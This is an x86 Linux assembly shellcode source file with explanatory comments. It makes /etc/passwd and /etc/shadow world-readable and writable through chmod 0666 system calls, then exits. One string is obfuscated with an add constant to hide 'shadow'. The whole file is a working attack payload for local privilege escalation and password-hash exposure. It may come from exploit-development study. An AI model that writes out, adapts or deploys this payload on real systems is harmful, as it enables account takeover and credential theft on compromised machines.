;Shellcode size : 84 bytes
global _start

_start:
    xor eax, eax                        ;Initialize eax to NULL
    mov cx, 0x1b6                       ;Move 0x1b6 inside cx (666 in octal)

    mov dword [esp + 12], eax           ;Push a NULL byte on the stack
    mov dword [esp + 8], 0x64777373
    mov dword [esp + 4], 0x61702f2f
    mov dword [esp], 0x6374652f         ;Push "/etc//passwd%00" on the stack
    mov ebx, esp                        ;Initialize ebx to the esp stack pointer

    push 0xf                        
    pop eax                             ;move the systemcall number inside eax
    ;Systemcall details:
    ; --> chmod("/etc/passwd%00", 0666o)
    int 0x80                            ;execute systemcall


    xor eax, eax                        ;Initialize eax to NULL
    mov dword [esp + 12], eax           ;Push a NULL byte on the stack
    mov dword [esp + 8], 0x443C312E
    add dword [esp + 8], 0x33333333
    mov dword [esp + 4], 0x68732f2f
    mov dword [esp], 0x6374652f         ;Push "/etc//shadow%00" on the stack
    mov ebx, esp                        ;Initialize ebx to the esp stack pointer
    mov al, 0xf                         ;move the systemcall number inside eax

    ;Systemcall details:
    ; --> chmod("/etc/shadow%00", 0666o)
    int 0x80                            ;execute systemcall


    push 0x1
    pop eax                             ;move the systemcall number inside eax
    mov ebx, eax
    dec ebx                             ;Initialize ebx to 0
    ;Systemcall details:
    ; --> exit(0)
    int 0x80                            ;execute systemcall
